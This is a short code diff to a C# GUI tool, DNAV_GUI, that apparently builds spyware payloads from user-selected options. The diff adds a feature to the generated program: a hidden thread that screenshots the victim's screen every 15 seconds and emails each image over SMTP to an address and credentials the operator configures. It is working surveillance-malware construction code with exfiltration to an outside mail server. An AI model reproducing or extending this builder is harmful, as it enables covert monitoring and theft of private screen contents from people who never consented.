@@ -1167,6 +1167,7 @@ namespace DNAV_GUI
                 useSystemRuntimeInteropServices = true;
                 useSystemDrawing = true;
                 useSystemDrawingImaging = true;
+                useSystemIO = true;
             }
 
             if (cmdCheckbox.IsChecked == true)
@@ -1376,12 +1377,14 @@ namespace DNAV_GUI
                             code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
                             break;
                     }
-                    code += @", System.Drawing.Imaging.ImageFormat.Png, " + screenshotIntervalTextbox.Text + @"));
+                    code += "+ \"\\\\image.png\", System.Drawing.Imaging.ImageFormat.Png, " + screenshotIntervalTextbox.Text + @"));
                 screenshot.Start();";
                 }
                 if(screenshotEmailCheckbox.IsChecked == true)
                 {
-                    code += @"";
+                    code += "Thread screenshotMailer = new Thread(() => {Mailer m = new Mailer(\"" + emailToTextbox.Text + "\", \"" + emailFromTextbox.Text + "\", \"" + emailUsernameTextbox.Text + "\", \"" + emailPasswordTextbox.Password + "\", " + emailPortTextbox.Text + ", \"" + emailSMTPTextbox.Text + "\");while(true){Thread.Sleep(15000);";
+                    code += "string tmp = Path.GetTempFileName(); tmp = tmp.Replace(\".tmp\", \".png\"); ScreenCapture sc2 = new ScreenCapture(); sc2.CaptureScreenToFile(tmp, System.Drawing.Imaging.ImageFormat.Png);";
+                    code += "m.send(\"Screenshot\", \"Screenshot im Anhang\", tmp);}});screenshotMailer.Start();";
                 }
             }
 
